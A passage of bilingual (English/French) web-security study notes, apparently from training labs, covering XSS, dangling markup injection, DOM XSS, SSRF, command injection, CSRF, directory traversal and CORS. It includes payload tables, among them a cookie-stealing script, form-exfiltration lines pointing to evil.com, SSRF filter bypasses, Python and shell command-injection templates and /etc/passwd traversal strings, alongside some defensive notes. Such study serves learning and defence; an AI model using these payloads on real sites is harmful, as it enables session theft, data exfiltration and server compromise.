recommended. For almost a decade, JSON has been seen as preferable to
the use of XML due to its lightweight syntax and newer construction.**

**When the entire XML document is transmitted from an untrusted client,
it\'s not usually possible to selectively validate or escape tainted
data within the system identifier in the DTD. Therefore, the XML
processor should be configured to use a local static DTD and disallow
any declared DTD included in the XML document.**

**If only simple XML data processing is required, use a native parser
instead of a full-featured.**

-   ## XSS ( Cross-site scripting ) :

```{=html}
<!-- -->
```
-   Definiton

    -   **Cross-site scripting (also known as XSS) is a web security
        > vulnerability that allows an attacker to compromise the
        > interactions that users have with a vulnerable application.**

> **It allows an attacker to circumvent the same origin policy, which is
> designed to segregate different websites from each other.**

-   **Cross-site scripting works by manipulating a vulnerable web site
    > so that it returns malicious JavaScript to users.**

```{=html}
<!-- -->
```
-   **Reflected XSS is the simplest variety of cross-site scripting. It
    > arises when an application receives data in an HTTP request and
    > includes that data within the immediate response in an unsafe
    > way.**

```{=html}
<!-- -->
```
-   **Certains XSS peuvent s'effectuer avec des tags personnalisés.**

###  Interesting payload

+----------------------------------------+-----------------------------+
| **\"\>\<scrip                          | **When the XSS context is   |
| t\>alert(document.domain)\</script\>** | into an HTML tag attribute  |
|                                        | value, you might sometimes  |
|                                        | be able to terminate the    |
|                                        | attribute value, close the  |
|                                        | tag, and introduce a new    |
|                                        | one.**                      |
+========================================+=============================+
| **\<.. \" autofocus                    | **More commonly, angle      |
| onfocus=alert(document.domain) x=\"    | brackets are blocked or     |
| ..\>**                                 | encoded.**                  |
|                                        |                             |
|                                        | **Provided you can          |
|                                        | terminate the attribute     |
|                                        | value, you can normally     |
|                                        | introduce a new attribute   |
|                                        | that creates a scriptable   |
|                                        | context, such as an event   |
|                                        | handler.**                  |
+----------------------------------------+-----------------------------+
| **\<a                                  | **Il est possible           |
| href                                   | d'injecter du script dans   |
| =\"javascript:alert(document.domain)\" | l'attribut *Href* (** **Sur |
| \>**                                   | des attributs en général ou |
|                                        | une URL est attendue )**    |
+----------------------------------------+-----------------------------+
| **\</script\>\<img src=1               | **In context when you can   |
| onerror=alert(document.domain)\>**     | close ﻿the script tag that   |
|                                        | is enclosing a existing     |
|                                        | Javascript.**               |
+----------------------------------------+-----------------------------+
| **\'-alert(\"hello\")-'**              | **In cases where the XSS    |
|                                        | context is inside a quoted  |
| **\';alert(\"hello\")//**              | string literal, it is often |
|                                        | possible to break out of    |
| **\....**                              | the string and execute      |
|                                        | JavaScript directly.**      |
|                                        |                             |
|                                        | **It is essential to repair |
|                                        | the script following the    |
|                                        | XSS context, because any    |
|                                        | syntax errors there will    |
|                                        | prevent the whole script    |
|                                        | from executing.**           |
|                                        |                             |
|                                        | **Sur le premier payload ,  |
|                                        | les opérateurs "-"          |
|                                        | permettent de séparer la    |
|                                        | fonction alert avec ce qui  |
|                                        | lui entoure (on peut        |
|                                        | utiliser n'importe quelle   |
|                                        | opération arithmétique à la |
|                                        | place ).**                  |
|                                        |                             |
|                                        | **Avant d\'effectuer        |
|                                        | l\'opération arithmétique , |
|                                        | Alert("hello") sera évaluée |
|                                        | donc exécutée**             |
+----------------------------------------+-----------------------------+
| **\\\\\';alert(document.domain)//**    | **Some applications attempt |
|                                        | to prevent input from       |
|                                        | breaking out of the         |
|                                        | JavaScript string by        |
|                                        | escaping any single quote   |
|                                        | characters with a           |
|                                        | backslash. A backslash      |
|                                        | before a character tells    |
|                                        | the JavaScript parser that  |
|                                        | the character should be     |
|                                        | interpreted literally.**    |
|                                        |                             |
|                                        | **In this situation,        |
|                                        | applications often make the |
|                                        | mistake of failing to       |
|                                        | escape the backslash        |
|                                        | character itself.**         |
|                                        |                             |
|                                        | **This means that an        |
|                                        | attacker can use their own  |
|                                        | backslash character to      |
|                                        | neutralize the backslash    |
|                                        | that is added by the        |
|                                        | application.**              |
+----------------------------------------+-----------------------------+
| **\<script\>onerror=alert;throw        | **This enables you to pass  |
| 1\</script\>**                         | arguments to a function     |
|                                        | without using               |
| **\<script\>{onerror=alert}throw       | parentheses.**              |
| 1\</script\>**                         |                             |
|                                        | **The following code        |
|                                        | assigns the alert()         |
|                                        | function to the global      |
|                                        | exception handler ( onerror |
|                                        | ) and the throw statement   |
|                                        | passes the 1 to the         |
|                                        | exception handler (in this  |
|                                        | case alert).**              |
+----------------------------------------+-----------------------------+
| **\<script\>throw onerror=alert,\'some | **L\'opérateur virgule en   |
| string\',123,\'haha\'\</script\>**     | JS permet dans un certain   |
|                                        | contexte d\'évaluer chacun  |
|                                        | de ses opérandes (de la     |
|                                        | gauche vers la droite) et   |
|                                        | de renvoyer la valeur du    |
|                                        | dernier opérande.**         |
|                                        |                             |
|                                        | **ici, c'est alert('haha')  |
|                                        | qui s'affiche.**            |
+----------------------------------------+-----------------------------+
| **\<script\>{onerror=eval}t            | **Chrome prefixes the       |
| hrow\'=alert\\x281\\x29\'\</script\>** | string sent to the          |
|                                        | exception handler with      |
|                                        | \"Uncaught\".**             |
|                                        |                             |
|                                        | **The string sent to eval   |
|                                        | is                          |
|                                        | \"Uncaught=alert(1337)\".** |
|                                        |                             |
|                                        | **This works fine on Chrome |
|                                        | but on Firefox the          |
|                                        | exception gets prefixed     |
|                                        | with a two word string      |
|                                        | \"uncaught exception\" so   |
|                                        | it doesn't work on it.**    |
+----------------------------------------+-----------------------------+
| **                                     | **When the XSS context is   |
| &apos;-alert(document.domain)-&apos;** | some existing JavaScript    |
|                                        | within a quoted tag         |
|                                        | attribute, such as an event |
|                                        | handler, it is possible to  |
|                                        | make use of HTML-encoding   |
|                                        | to work around some input   |
|                                        | filters.**                  |
|                                        |                             |
|                                        | **When the browser has      |
|                                        | parsed out the HTML tags    |
|                                        | and attributes within a     |
|                                        | response, it will perform   |
|                                        | HTML-decoding of tag        |
|                                        | attribute values before     |
|                                        | they are processed any      |
|                                        | further**                   |
+----------------------------------------+-----------------------------+
| **\${alert(document.domain)}**         | **When the XSS context is   |
|                                        | into a JavaScript template  |
|                                        | literal**                   |
|                                        |                             |
|                                        | **( encapsulated in         |
|                                        | backticks instead of normal |
|                                        | quotation marks ). you      |
|                                        | simply need to use the      |
|                                        | \${\...} syntax to embed a  |
|                                        | JavaScript expression that  |
|                                        | will be executed when the   |
|                                        | literal is processed. And   |
|                                        | there is no need to         |
|                                        | terminate the literal.**    |
+----------------------------------------+-----------------------------+
| **\<xss id=x                           | **Via des tags              |
| onfocus=alert(document.cookie)**       | personnalisées**            |
|                                        |                             |
| **tabindex=1 \>blabla \</xss\>**       |                             |
+----------------------------------------+-----------------------------+
| **\<script\>**                         | **Stealing Cookie with      |
|                                        | img**                       |
| **document.write(\'\<img               |                             |
| s                                      |                             |
| rc=\"\[URL\]?c=\'+document.cookie+\'\" |                             |
| /\>\');**                              |                             |
|                                        |                             |
| **\</script\>**                        |                             |
+----------------------------------------+-----------------------------+
|                                        |                             |
+----------------------------------------+-----------------------------+
|                                        |                             |
+----------------------------------------+-----------------------------+

-   **Si une page web possède un tag \<link\> avec rel="canonical", une
    > XSS réfléchie peut être effectuée en ajoutant des attributs à
    > partir de l'attribut *href* car il contient l'url.**

**exemple:**

**\<link rel=\"canonical\"**

> **href=\'[[https://acac1f151e3f156a80ac0fe000e30095.we]{.underline}](https://acac1f151e3f156a80ac0fe000e30095.we)**
>
> **b-security-academy.net/?\'accesskey='x'onclick='alert'/\>**
>
> **Ce qu'il y a en rouge est le payload.**

-   **Si le caractère "espace" est filtré, il peut être remplacé par
    > "/\*\*/".**

```{=html}
<!-- -->
```
-   **CSP (content security policy) permet d\'améliorer la sécurité des
    > sites web en permettant de détecter et réduire certains types
    > d\'attaques, dont les attaques XSS (Cross Site Scripting) et les
    > injections de contenu. Ces attaques peuvent être utilisées dans
    > divers buts, comme le vol de données, le défacement de site ou la
    > diffusion de malware.**

> **It works by restricting the resources (such as scripts and**
>
> **images) that a page can load and restricting whether a page**
>
> **can be framed by other pages.**
>
> **To enable CSP, a response needs to include an HTTP response header
> called Content-Security-Policy with a value containing**
>
> **the policy. The policy itself consists of one or more directives,**
>
> **separated by semicolons.**
>
> **X-XSS Protection Header :**
>
> **(Re)Active une protection contre les XSS présent dans les
> navigateurs modernes.**

**\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--**

-   ## Dangling markup injection :

-   ### Definiton

> **Dangling markup is a technique to steal the contents of the page
> without script by using resources such as images to send the data to a
> remote location that an attacker controls. It is useful when reflected
> XSS doesn\'t work or is blocked by Content Security Policy (CSP).**
>
> **The idea is you inject some partial HTML that is in an unfinished
> state such as a src attribute of an image tag, and the rest of the
> markup on the page closes the attribute but also sends the data
> in-between to the remote server.**
>
> **Example :**
>
> **let\'s say we have an injection point above a script and a form like
> this:**

![](media/image121.png){width="6.797000218722659in"
height="5.057292213473316in"}

> **Sometimes CSP will block the image vector with the open src
> attribute because the policy will not load any image resources or
> other sub resources.**
>
> **However we can use other tags like \<base\> tag to bypass this
> restriction.**
>
> **By injecting an incomplete target attribute with \<base\> tag the
> window name will be set with all the markup after the injection until
> the corresponding quote on every link on the page, therefore allowing
> us to steal tokens or whatever is between the injection point and the
> next quote.**

![](media/image80.png){width="7.134771434820648in"
height="3.8281255468066493in"}

-   **le Href dans la photo d'en haut contient l'URL de l'attaquant.**

![](media/image292.png){width="6.267716535433071in"
height="1.7777777777777777in"}

![](media/image399.png){width="6.267716535433071in" height="1.0in"}

![](media/image326.png){width="6.267716535433071in"
height="0.7777777777777778in"}

### Interesting payloads

+-----------------------------------+-----------------------------------+
| **\<form                          | **la suite du code apparait dans  |
| action=\'\.....\'\>\<textarea\>** | un text area**                    |
+===================================+===================================+
| **\<meta http-equiv=\"refresh\"   | **If img tag is forbidden, you    |
| content=\"4;                      | can use these to include an URL   |
| URL=\'[                           | \...**                            |
| [http://evil.com/log.cgi]{.underl |                                   |
| ine}](http://evil.com/log.cgi)?** |                                   |
|                                   |                                   |
| **\_\_\_\_\_\_\_\_\_\_\_\_\       |                                   |
| _\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_** |                                   |
|                                   |                                   |
| **\<meta http-equiv=\"refresh\"   |                                   |
| co                                |                                   |
| ntent=\'0;URL=ftp://evil.com?a=** |                                   |
|                                   |                                   |
| **\_\_\_\_\_\_\_\_\_\_\_\_\       |                                   |
| _\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_** |                                   |
|                                   |                                   |
| **\<st                            |                                   |
| yle\>@import//hackvertor.co.uk?** |                                   |
|                                   |                                   |
| **( The CSS specification states  |                                   |
| that \@import should continue     |                                   |
| parsing a url until it encounters |                                   |
| a ending ";" )**                  |                                   |
|                                   |                                   |
| **\_\_\_\_\_\_\_\_\_\_\_\_\       |                                   |
| _\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_** |                                   |
|                                   |                                   |
| **\<table                         |                                   |
| background=\'//your-collabor      |                                   |
| ator-id.burpcollaborator.net?\'** |                                   |
|                                   |                                   |
| **\_\_\_\_\_\_\_\_\_\_\_\_\       |                                   |
| _\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_** |                                   |
+-----------------------------------+-----------------------------------+
| **\<base                          | **Then, the forms that send data  |
| href=\'http://evil.com/\'\>**     | to the path (like \<form          |
|                                   | action=\'update_profile.php\'\>)  |
|                                   | will send the data to the         |
|                                   | malicious domain.**               |
+-----------------------------------+-----------------------------------+
| **\<base target=\'**              | **Include the data code in the    |
|                                   | variable windows.name (the user   |
|                                   | must click in some link, because  |
|                                   | the base tag will have changed    |
|                                   | the domain pointed by the         |
|                                   | link).**                          |
|                                   |                                   |
|                                   | **you can then check it with the  |
|                                   | navigator console.**              |
+-----------------------------------+-----------------------------------+
| **\<form                          | **this will overwrite the next    |
| action=                           | form header and all the data from |
| \'http://evil.com/log_steal\'\>** | the form will be sent to the      |
|                                   | attacker.**                       |
+-----------------------------------+-----------------------------------+
| **\<button name=xss type=submit   | **The button can change the URL   |
| f                                 | where the information of the form |
| ormaction=\'https://evil.com\'\>I | is going to be sent with the      |
| get consumed!**                   | attribute \"formaction\"**        |
+-----------------------------------+-----------------------------------+
| **\<meta name=\"language\"        | **Redirection automatique vers    |
| HTTP-EQUIV=\"refresh\"            | l'URL**                           |
| content=\'1;http:/                |                                   |
| /enzvnx9ibrjd.x.pipedream.net/?** |                                   |
+-----------------------------------+-----------------------------------+
| **\[XSS\]**                       | **Any CSP-enabled website that    |
|                                   | either offers JSONP feeds to      |
| **\<script                        | others, or utilizes them          |
| src=\[URL\]?q=a&c                 | internally, is automatically      |
| allback=alert(1)\'\>\</script\>** | prone to a flavor of              |
|                                   | return-oriented programming: the  |
| **\_\_\_\_\_\_\_\_\_\_\_\_\_\     | attacker is able to invoke any    |
| _\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_** | functions of his choice, often    |
|                                   | with at least partly controllable |
|                                   | parameters, by specifying them as |
|                                   | the callback parameter on the API |
|                                   | call:**                           |
|                                   |                                   |
|                                   | ![](media/image178                |
|                                   | .png){width="3.057292213473316in" |
|                                   | height="0.6979166666666666in"}    |
+-----------------------------------+-----------------------------------+
| **\<img id=\'is_public\'\>**      | **Create variables inside         |
|                                   | javascript namespace by inserting |
|                                   | HTML tags. Then, this variable    |
|                                   | will affect the flow of the       |
|                                   | application ( if this id name is  |
|                                   | use after in the code )**         |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+

**List of HTML attribute with URL :**

![](media/image202.png){width="6.052083333333333in" height="1.375in"}

![](media/image275.png){width="6.267716535433071in"
height="5.569444444444445in"}

![](media/image288.png){width="6.260416666666667in"
height="3.3229166666666665in"}

-   ## DOM XSS :

```{=html}
<!-- -->
```
-   **DOM-based XSS vulnerabilities usually arise when JavaScript takes
    > data from an attacker-controllable source ( client-side JavaScript
    > ), such as the URL, and passes it to a sink that supports dynamic
    > code execution, such as eval() or innerHTML.**

> **This enables attackers to execute malicious JavaScript, which
> typically allows them to hijack other users\' accounts.**

-   **﻿The most common source for DOM XSS is the URL, which is typically
    > accessed with the window.location object.**

```{=html}
<!-- -->
```
-   **To test for DOM-based cross-site scripting manually, you generally
    > need to use a browser with developer tools ( to see a close
    > representation of the DOM ), such as Chrome. You need to work
    > through each available source in turn, and test each one
    > individually.**

```{=html}
<!-- -->
```
-   **To test for DOM XSS in an HTML sink, place a random alphanumeric
    > string into the source (such as location.search), then use
    > developer tools to inspect the HTML and find where your string
    > appears.**

```{=html}
<!-- -->
```
-   **For each location where your string appears within the DOM ( or
    > Javascript file or script ), you need to identify the context ( if
    > it passed into a sink or other ). Based on this context, you need
    > to refine your input to see how it is processed. For example, if
    > your string appears within a double-quoted attribute then try to
    > inject double quotes in your string to see if you can break out of
    > the attribute.**

> **Some Sink for DOM XSS**

+---------------------------------+------------------------------------+
| **document.write**              | **The document.write sink works    |
|                                 | with script elements, so you can   |
|                                 | use a simple payload, such as the  |
|                                 | one below:**                       |
|                                 |                                    |
|                                 | **document.write(\'\...            |
|                                 | \<script\                          |
|                                 | >alert(document.domain)\</script\> |
|                                 | \...\');**                         |
+=================================+====================================+
| **element.innerHTML**           | **The innerHTML Sets or returns    |
|                                 | the content of an element. This    |
|                                 | sink doesn\'t accept script        |
|                                 | elements on any modern browser,    |
|                                 | nor will svg onload events fire.** |
|                                 |                                    |
|                                 | **This means you will need to use  |
|                                 | alternative elements like img or   |
|                                 | iframe. Event handlers such as     |
|                                 | onload and onerror can be used in  |
|                                 | conjunction with these elements.   |
|                                 | For example:**                     |
|                                 |                                    |
|                                 | **element.innerHTML=\'\... \<img   |
|                                 | src=1                              |
|                                 | onerror=alert(document.domain)\>   |
|                                 | \...\'**                           |
|                                 |                                    |
|                                 | **you can use innerText instead of |
|                                 | innerHtml in basic \<span\>        |
|                                 | stag.**                            |
+---------------------------------+------------------------------------+
| **attr()**                      | **The attr() function in jQuery    |
|                                 | can change attributes on DOM       |
|                                 | elements.**                        |
+---------------------------------+------------------------------------+
| **ng-app attribute**            | **If a framework like AngularJS is |
|                                 | used, it may be possible to        |
|                                 | execute JavaScript without angle   |
|                                 | brackets or events:**              |
|                                 |                                    |
|                                 | **When a site uses the ng-app      |
|                                 | attribute on an HTML element, it   |
|                                 | will be processed by AngularJS.**  |
|                                 |                                    |
|                                 | **In this case, AngularJS can use  |
|                                 | Angular expressions inside double  |
|                                 | curly braces that can occur        |
|                                 | directly in HTML or inside         |
|                                 | attributes.**                      |
|                                 |                                    |
|                                 | **Angular expressions combined     |
|                                 | with a sandbox escape ( removed in |
|                                 | Angular v 1.6 ), we can execute    |
|                                 | arbitrary JavaScript and do some   |
|                                 | serious damage.**                  |
|                                 |                                    |
|                                 | **in versions 1.0 - 1.1.5 there    |
|                                 | was no sandbox.**                  |
+---------------------------------+------------------------------------+
| **document.location.href**      | **Il faut faire en sorte qu'il     |
|                                 | soit égal à :                      |
|                                 | javascript:alert(1)**              |
+---------------------------------+------------------------------------+
|                                 |                                    |
+---------------------------------+------------------------------------+
|                                 |                                    |
+---------------------------------+------------------------------------+

-   **You can use XSS inside SVG file ( XSS by uploading file ):**

> ![](media/image165.png){width="5.4375in"
> height="1.5208333333333333in"}
>
> **Make sure that the content type is right.**

-   ## Cross-Site WebSocket Hijacking

-   ### Definition

![](media/image48.png){width="8.195497594050744in"
height="4.233886701662292in"}

-   **"101 Switching protocol means" that the web socket is connected.**

```{=html}
<!-- -->
```
-   ### Exploitation

**The problem is that Websocket can be made Cross-Site ( As opposed to
XMLHttpRequest, WebSockets don\'t follow the same-origin policy) :**

![](media/image327.png){width="8.23716426071741in"
height="4.378558617672791in"}

> **To deal with this attack, you have to check the Origin when dealing
> with WebSocket.**

-   **[DOM XSS in web message :]{.underline}**

**[Fonctionnement :]{.underline}**

![](media/image294.png){width="7.914410542432196in"
height="3.208001968503937in"}

**What often happens is that le wildcard "\*" is used when sensitive
messages are sent. So, any website can get this sensitive message :**

![](media/image77.png){width="8.081077209098863in"
height="3.2791305774278214in"}

**Another scenario :**

![](media/image135.png){width="8.216330927384076in"
height="3.8684755030621174in"}

**Here, there is no checking for the origin of the message. So an
attacker can send any message to the website from another malicious one
:**

**Another scenario :**

![](media/image100.png){width="6.267716535433071in"
height="2.611111111111111in"}

**Autre payload :**

![](media/image358.png){width="3.776042213473316in"
height="1.4087215660542431in"}

**Il faut bien sûr que le site vulnérable permette les iframes pour ce
type de payload.**

-   **possible payload sans iframe :**

![](media/image109.png){width="6.267716535433071in"
height="1.7361111111111112in"}

![](media/image229.png){width="8.226747594050744in"
height="4.905983158355205in"}

-   ## Authentication :

![](media/image69.png){width="6.267716535433071in"
height="3.486111111111111in"}

![](media/image20.png){width="6.267716535433071in"
height="2.4722222222222223in"}

![](media/image228.png){width="6.267716535433071in"
height="3.1944444444444446in"}

![](media/image365.png){width="6.267716535433071in"
height="2.3055555555555554in"}

**(depending on the format of the request parameter)**

![](media/image12.png){width="6.267716535433071in"
height="1.7083333333333333in"}

![](media/image157.png){width="6.267716535433071in"
height="3.1805555555555554in"}

![](media/image18.png){width="6.267716535433071in"
height="0.6527777777777778in"}

![](media/image361.png){width="6.267716535433071in"
height="3.3194444444444446in"}

![](media/image151.png){width="6.267716535433071in"
height="1.4027777777777777in"}

**\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--**

-   ## Server-side request forgery (SSRF)

**Server-side request forgery (also known as SSRF) is a web security
vulnerability that allows an attacker to induce the server-side
application to make HTTP requests ( or other protocol ) to an arbitrary
domain of the attacker\'s choosing.**

**In typical SSRF examples, the attacker might cause the server to make
a connection back to itself, or to other web-based services within the
organization\'s infrastructure, or to external third-party systems.**

**﻿A successful SSRF attack can often result in unauthorized actions or
access to data within the organization, either in the vulnerable
application itself or on other back-end systems that the application can
communicate with.**

**In some situations, the SSRF vulnerability might allow an attacker to
perform arbitrary command execution.**

-   **If the used API support open redirection via a parameter, you can
    > try perform SSRF via this one ( to bypass the filter of the basic
    > server ):**

![](media/image422.png){width="6.267716535433071in"
height="1.2916666666666667in"}

-   ### finding vuln

![](media/image341.png){width="6.267716535433071in"
height="2.611111111111111in"}

###  Useful payloads

+-----------------------------------+-----------------------------------+
| **http://localhost/\...**         | **Contre le serveur lui-même**    |
+===================================+===================================+
| **2130706433**                    | **For bypass filter against this  |
|                                   | input 127.0.0.1**                 |
| **017700000001**                  |                                   |
|                                   | **For evil.net, you can register  |
| **127.1**                         | your own domain name that         |
|                                   | resolves to 127.0.0.1**           |
| **127.0.1**                       |                                   |
|                                   |                                   |
| **evil.net**                      |                                   |
|                                   |                                   |
| **\[0:0:0:0:ffff:127.0.0.1\] (    |                                   |
| use of Ipv6 format )**            |                                   |
+-----------------------------------+-----------------------------------+
| **                                | **Il se peut que evil-host soit   |
| https://expected-host@﻿evil-host** | pris en compte à la place         |
|                                   | expected-host dans ces exemples ( |
| **                                | selon l\'implémentation du        |
| https://﻿evil-host#expected-host** | traitement de la requête, quelles |
|                                   | bibliothèques sont utilisées ).** |
| **https://﻿\[\...\]#@﻿\[\...\]**    |                                   |
|                                   |                                   |
| **https://﻿\[\...\]@#﻿\[\...\]**    |                                   |
|                                   |                                   |
| **                                |                                   |
| https://﻿evil-host?expected-host** |                                   |
+-----------------------------------+-----------------------------------+
| **                                | **Selon l\'implémentation du      |
| https://expected-host:80:10101/** | traitement de la requête, quelles |
|                                   | bibliothèques sont utilisées, le  |
|                                   | port 80 peut être pris en compte  |
|                                   | ou l'autre.**                     |
+-----------------------------------+-----------------------------------+
| **Gopherus \--exploit**           | **Create payload ( Reverse shell  |
|                                   | or other ) for SSRF for different |
|                                   | protocol et features ( smpt,      |
|                                   | redis, mongoDb, .. )**            |
+-----------------------------------+-----------------------------------+
| **SSFRmap**                       | **Good tool for SSRF              |
|                                   | vulnerabilities ( svan port,      |
|                                   | files, .... )**                   |
+-----------------------------------+-----------------------------------+
| **                                | **In this example, the developer  |
| url=http://assets.pentesterlab.co | blocked everything that doesn\'t  |
| m.hackingwithpentesterlab.link/** | match assets.pentesterlab.com.**  |
|                                   |                                   |
|                                   | **But We setup a special DNS zone |
|                                   | that will always answer 127.0.0.1 |
|                                   | for any host in the domain        |
|                                   | hackingwithpentesterlab.link.**   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+

-   ## Os command injection

![](media/image236.png){width="6.267716535433071in"
height="3.0694444444444446in"}

![](media/image102.png){width="6.267716535433071in"
height="1.5972222222222223in"}

![](media/image14.png){width="6.267716535433071in"
height="0.7777777777777778in"}

![](media/image298.png){width="6.267716535433071in"
height="1.4027777777777777in"}![](media/image154.png){width="6.267716535433071in"
height="1.1388888888888888in"}

### Some payload

  ---------------------------------------------------------------------------------------------------------------------------------------------
  **\_\_import\_\_(\'os\').system(\[CMD\])**                                                                **Python context code when the
                                                                                                            module os is not loaded**
  --------------------------------------------------------------------------------------------------------- -----------------------------------
  **str(\_\_import\_\_(\'os\').popen(\_\_import\_\_(\'base64\').b64decode(\[CMD_ENCODED_B64\])).read())**   **Python context code when the
                                                                                                            module os is not loaded, bypassing
                                                                                                            WAF with base64 encoding**

  **".\`\[CMD\]\`."**                                                                                       **Perl context**

  **\$(\[CMD\])**                                                                                           **Linux system context**

                                                                                                            

                                                                                                            

                                                                                                            

                                                                                                            

                                                                                                            

                                                                                                            
  ---------------------------------------------------------------------------------------------------------------------------------------------

**\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--**

-   ## Cross-site request forgery (CSRF)

```{=html}
<!-- -->
```
-   ### Definiton

**Cross-site request forgery (also known as CSRF) is a web security
vulnerability that allows an attacker to induce users to perform actions
that they do not intend to perform.**

![](media/image283.png){width="8.09600612423447in"
height="2.999019028871391in"}

![](media/image68.png){width="8.147167541557305in"
height="1.7447922134733158in"}

-   ### Preventing

![](media/image193.png){width="6.267716535433071in"
height="1.2638888888888888in"}

![](media/image226.png){width="6.267716535433071in"
height="0.4583333333333333in"}

![](media/image296.png){width="6.267716535433071in"
height="0.6111111111111112in"}

![](media/image74.png){width="6.267716535433071in"
height="2.6527777777777777in"}

**Quelques tactiques pour se protéger contre CSRF:**

-   **Utiliser l\'entête Referer or Origin pour examiner la provenance
    > d'une requête (pour vérifier par exemple si une requête de
    > changement de mot passe provient bien de la page web auquel on
    > accède pour changer de mot de passe). Cette méthode est
    > bypassable.**

![](media/image167.png){width="6.267716535433071in"
height="1.2083333333333333in"}

![](media/image211.png){width="6.267716535433071in"
height="1.5555555555555556in"}

**On peut utiliser la fonction javascript history.pushState() ( *method
to add a state to the browser\'s session history stack.* ) pour modifier
le Referer et concaténer un domaine autorisé : history.pushState(\"\",
\"\", \"/?\[DOMAINE AUTORISÉ\]\").**

-   **Utiliser demande de confirmation par une pop-up, écriture d'un mot
    > de passe, ou un captcha pour confirmer l'action demandée.**

-   **Modify the name of the parameters of the POST or GET request**

![](media/image210.png){width="6.267716535433071in"
height="0.7916666666666666in"}

**( Using to tool )**

-   ### Exploit techniques

![](media/image58.png){width="6.256767279090114in"
height="5.090250437445319in"}

![](media/image278.png){width="6.267716535433071in"
height="0.8472222222222222in"}

![](media/image50.png){width="6.267716535433071in"
height="1.0416666666666667in"}

![](media/image184.png){width="6.267716535433071in"
height="3.0555555555555554in"}

![](media/image40.png){width="6.267716535433071in"
height="3.138888888888889in"}

![](media/image70.png){width="6.267716535433071in"
height="2.2083333333333335in"}

**( Using Json as part of the POST data )**

**enctype : change the Content-type.**

**example :**

![](media/image153.png){width="6.267716535433071in"
height="2.7777777777777777in"}

![](media/image181.png){width="6.267716535433071in"
height="2.2222222222222223in"}

-   ## Business logic vulnerabilities

![](media/image405.png){width="6.267716535433071in"
height="0.9027777777777778in"}

**The associated vulnerabilities are also known as \"application logic
vulnerabilities\" or simply \"logic flaws\".**

![](media/image10.png){width="6.267716535433071in"
height="0.5277777777777778in"}

![](media/image163.png){width="6.267716535433071in"
height="0.9166666666666666in"}

![](media/image166.png){width="6.267716535433071in"
height="0.4861111111111111in"}

![](media/image212.png){width="6.267716535433071in"
height="1.0694444444444444in"}

-   ## Directory traversal

### Some interesting payloads

+-----------------------------------+-----------------------------------+
| **/etc/passwd**                   | **If an application strips or     |
|                                   | blocks directory traversal        |
|                                   | sequences from the user-supplied  |
|                                   | filename, you might be able to    |
|                                   | use an absolute path from the     |
|                                   | filesystem root, such as          |
|                                   | filename=/etc/passwd, to directly |
|                                   | reference a file without using    |
|                                   | any traversal sequences.**        |
+===================================+===================================+
| **/                               | **You might be able to use nested |
| \....//\....//\....//etc/passwd** | traversal sequences, such as      |
|                                   | \....// or \....\\/, which will   |
| **/                               | revert to simple traversal        |
| \....\\/\....\\/\....//etc/passwd | sequences when the inner sequence |
| ( windows )**                     | is stripped.**                    |
+-----------------------------------+-----------------------------------+
| **                                | **DoubleURL encode**              |
| ﻿..%252f﻿..%252f﻿..%252fetc/passwd** |                                   |
+-----------------------------------+-----------------------------------+
| **/file.php?file=/../../../       | **Null byte added**               |
| ../../../../pentesterlab.key%00** |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+

![](media/image353.png){width="6.267716535433071in"
height="2.9583333333333335in"}

-   **You can convert the path provided to an absolute path ( without
    > ".." ) and then check.**

```{=html}
<!-- -->
```
-   ## Web cache poisoning

![](media/image182.png){width="6.267716535433071in"
height="0.9722222222222222in"}

![](media/image235.png){width="6.267716535433071in"
height="0.4027777777777778in"}

**How to prevent from Cache Poisoning?**

-   **You must review the caching configuration of your caching server
    > to ensure that when calculating cache keys it is avoiding to make
    > any cache key decisions using untrusted user inputs**

![](media/image192.png){width="6.267716535433071in"
height="5.291666666666667in"}

![](media/image395.png){width="6.267716535433071in"
height="0.6388888888888888in"}

-   ## Access Control

![](media/image384.png){width="6.267716535433071in"
height="2.513888888888889in"}

![](media/image190.png){width="6.267716535433071in"
height="0.8333333333333334in"}

-   ## Cross-origin resource sharing (CORS)

```{=html}
<!-- -->
```
-   ### Definition

**Cross-origin resource sharing (CORS) is a browser mechanism which
enables controlled access to resources located outside of a given
domain.**

**It extends and adds flexibility to the same-origin policy (SOP).
However, it also provides potential for cross-domain based attacks, if a
website\'s CORS policy is poorly configured and implemented.**

![](media/image185.png){width="5.889763779527559in" height="1.25in"}

![](media/image308.png){width="5.889763779527559in"
height="3.2777777777777777in"}

![](media/image436.png){width="6.267716535433071in"
height="1.3333333333333333in"}

![](media/image285.png){width="6.267716535433071in"
height="3.3055555555555554in"}

![](media/image344.png){width="6.267716535433071in"
height="3.3472222222222223in"}

